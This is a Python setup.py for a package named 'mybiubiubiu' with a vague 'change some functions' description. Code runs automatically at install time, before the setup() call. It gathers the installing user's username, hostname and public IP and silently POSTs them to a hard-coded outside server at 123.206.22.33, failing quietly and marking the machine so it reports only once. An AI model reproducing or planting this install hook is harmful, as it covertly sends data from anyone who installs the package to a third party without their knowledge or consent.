#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import sys
import time
import json
import getpass
import hashlib
import platform
import tempfile
import webbrowser
import setuptools
from setuptools.command.install import install


def request(url, method='GET', data=None, headers=None):
    headers = headers or {}
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def fun():
    username = getpass.getuser()
    hostname = platform.node()
    #print username
    #print hostname
    ip = request("https://enabledns.com/ip",method='GET')
    timenow = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    filename = os.path.join(
        tempfile.gettempdir(),
        hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()
    )
    print filename
    if os.path.exists(filename):
        #print “filename exists”
        return
    
    data = {
        "username": str(username),
        "hostname": str(hostname),
        "ip":str(ip),
        "package": "mybiubiubiu",
        "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
        "time":str(timenow),
        "submit":"Submit"
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        request(
            url="http://123.206.22.33:5000/p/",
            method='POST',
            data=json.dumps(data).encode("utf-8", errors='ignore'),
            headers=headers
        )
        #print "hhh"
    except:
        #print "failed"
        pass



fun()



setuptools.setup(
    name="mybiubiubiu",
    version="0.1.4",
    url="",

    author="biubiubiu",
    author_email="biubiubiu2@yopmail.com",

    description="change some functions",
    long_description=open('README.rst').read(),

    packages=setuptools.find_packages(),
    # cmdclass={
    #     'install': AbortInstall
    # },

    install_requires=[],

    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)